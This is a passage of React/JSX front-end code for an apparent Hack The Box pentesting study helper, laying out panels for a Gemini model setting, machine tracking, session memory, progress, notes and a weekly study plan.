              <div className="htb-error-box rounded-md px-3 py-2 text-sm">
                <div>{error}</div>
                {errorHint && <div className="mt-2 text-xs text-htb-secondary">{errorHint}</div>}
              </div>
            )}

          <div className="flex flex-wrap items-center gap-3 text-xs text-htb-secondary">
            <label className="flex items-center gap-2">
              <input
                type="checkbox"
                checked={streamEnabled}
                onChange={(event) => setStreamEnabled(event.target.checked)}
                className="h-3 w-3 rounded border border-htb-border bg-htb-primary text-htb-accent focus:ring-2 focus:ring-htb-accent"
              />
              Streaming
            </label>
          </div>
          </section>

          <aside className="flex flex-col gap-4">
            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Gemini Model
              </h2>
              <p className="mt-2 text-xs text-htb-secondary">
                Uses <code className="rounded bg-htb-primary border border-htb-border px-1 text-htb-accent">GEMINI_API_KEY</code> from .env.local. Get a key at <a href="https://aistudio.google.com/apikey" target="_blank" rel="noreferrer" className="text-htb-accent hover:underline">aistudio.google.com/apikey</a>.
              </p>
              <div className="mt-4">
                <label className="text-xs font-semibold uppercase tracking-wide text-htb-secondary">
                  Model
                </label>
                <input
                  value={model}
                  onChange={(event) => setModel(event.target.value)}
                  placeholder="gemini-2.5-flash"
                  className="mt-1 w-full rounded-md border border-htb-border bg-htb-primary px-3 py-2 text-xs text-htb-text focus:outline-none focus:ring-2 focus:ring-htb-accent focus:border-htb-accent"
                />
                <p className="mt-2 text-xs text-htb-secondary">
                  Examples: gemini-2.5-flash, gemini-2.5-flash-lite, gemini-pro. Saves automatically.
                </p>
              </div>
            </section>

            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Machine Tracker
              </h2>
              <p className="mt-1 text-xs text-htb-secondary">
                Track IP, ports, services, creds, and flags per machine. Set as context to send to AI.
              </p>
              <MachineTrackerForm onAdd={addMachine} />
              <div className="mt-3 flex max-h-[280px] flex-col gap-2 overflow-y-auto pr-1">
                {machines.length === 0 ? (
                  <div className="rounded-md border border-dashed border-htb-border px-3 py-4 text-center text-xs text-htb-secondary">
                    No machines yet. Add one above.
                  </div>
                ) : (
                  machines.map((m) => (
                    <MachineCard
                      key={m.id}
                      machine={m}
                      isExpanded={expandedMachineId === m.id}
                      onToggle={() =>
                        setExpandedMachineId((id) => (id === m.id ? null : m.id))
                      }
                      onUpdate={(updates) => updateMachine(m.id, updates)}
                      onDelete={() => deleteMachine(m.id)}
                      onSetContext={() => setSessionContext(machineToContext(m))}
                      onCopyFlag={copyFlag}
                    />
                  ))
                )}
              </div>
            </section>

            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Session Memory
              </h2>
              <p className="mt-1 text-xs text-htb-secondary">
                Current challenge context — sent with every message so the AI remembers ports, creds, and progress.
              </p>
              <textarea
                value={sessionContext}
                onChange={(event) => setSessionContext(event.target.value)}
                placeholder={"Machine: 10.10.10.5\nPorts: 22, 80, 443\nServices: SSH, Apache\nCreds: user:pass\nShell: www-data\nCurrent: enumerating for privesc"}
                rows={5}
                className="mt-3 w-full rounded-md border border-htb-border bg-htb-primary px-3 py-2 text-xs text-htb-text focus:outline-none focus:ring-2 focus:ring-htb-accent focus:border-htb-accent"
              />
              <button
                type="button"
                onClick={() => setSessionContext("")}
                className="mt-2 rounded-md border border-htb-border px-3 py-1 text-xs font-semibold text-htb-secondary transition hover:border-htb-accent hover:text-htb-accent"
              >
                Clear
              </button>
            </section>

            <CheatSheetPanel />

            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Progress Tracker
              </h2>
              <div className="mt-3 text-xs text-htb-secondary">
                Week {weekIndex} · Day {dayIndex}
              </div>
              <div className="mt-2 text-sm font-semibold text-htb-text">
                {getTodayPlan().focus}
              </div>
              <div className="mt-1 text-xs text-htb-secondary">
                {getTodayPlan().topic}
              </div>
              <div className="mt-2 text-xs text-htb-secondary">
                Labs: {getTodayPlan().labs.join(", ")}
              </div>
              <div className="mt-3 flex flex-wrap gap-2">
                <button
                  type="button"
                  onClick={generateTodaysPrompt}
                  className="rounded-md border border-htb-accent px-3 py-1 text-xs font-semibold text-htb-accent transition hover:bg-htb-accent hover:text-htb-primary"
                >
                  Generate today&apos;s session
                </button>
                <button
                  type="button"
                  onClick={advanceProgress}
                  className="rounded-md border border-htb-border px-3 py-1 text-xs font-semibold text-htb-secondary transition hover:border-htb-accent hover:text-htb-accent"
                >
                  Mark day complete
                </button>
                <button
                  type="button"
                  onClick={resetProgress}
                  className="rounded-md border border-htb-border px-3 py-1 text-xs text-htb-secondary transition hover:text-htb-accent"
                >
                  Reset
                </button>
              </div>
            </section>

            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Session Notes
              </h2>
              <textarea
                value={notes}
                onChange={(event) => setNotes(event.target.value)}
                placeholder="Write your notes here..."
                rows={6}
                className="mt-3 w-full rounded-md border border-htb-border bg-htb-primary px-3 py-2 text-xs text-htb-text focus:outline-none focus:ring-2 focus:ring-htb-accent focus:border-htb-accent"
              />
              <div className="mt-3 flex flex-wrap gap-2">
                <button
                  type="button"
                  onClick={copyNotes}
                  className="rounded-md border border-htb-accent px-3 py-1 text-xs font-semibold text-htb-accent transition hover:bg-htb-accent hover:text-htb-primary"
                >
                  Copy notes
                </button>
                <button
                  type="button"
                  onClick={downloadNotes}
                  className="rounded-md border border-htb-border px-3 py-1 text-xs font-semibold text-htb-secondary transition hover:border-htb-accent hover:text-htb-accent"
                >
                  Download .txt
                </button>
              </div>
            </section>

            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Daily 30-Minute Format
              </h2>
              <div className="mt-3 flex flex-col gap-2">
                {dailySession.map((item) => (
                  <div key={item.title} className="rounded-md border border-htb-border bg-htb-primary p-2">
                    <div className="text-xs font-semibold text-htb-text">
                      {item.title}
                    </div>
                    <div className="text-xs text-htb-secondary">
                      {item.detail}
                    </div>
                  </div>
                ))}
              </div>
            </section>

            <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
              <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
                Pentesting basics (what this helper knows)
              </h2>
              <div className="mt-3 flex max-h-[360px] flex-col gap-3 overflow-y-auto pr-2">
                {studyPlan.map((week) => (
                  <div key={week.week} className="rounded-md border border-htb-border p-3">
                    <div className="text-xs font-semibold uppercase tracking-wide text-htb-secondary">
                      Week {week.week}
                    </div>
                    <div className="text-sm font-semibold text-htb-text">
                      {week.focus}
                    </div>
                    <ul className="mt-2 list-disc pl-4 text-xs text-htb-secondary">
                      {week.days.map((day, index) => (
                        <li key={`${week.week}-${day}-${index}`}>{day}</li>
                      ))}
                    </ul>
                    <div className="mt-2 text-xs text-htb-secondary">
                      Labs: {week.labs.join(", ")}
                    </div>
                  </div>
                ))}
              </div>
            </section>
          </aside>
        </div>
      </main>
    </div>
  );
}
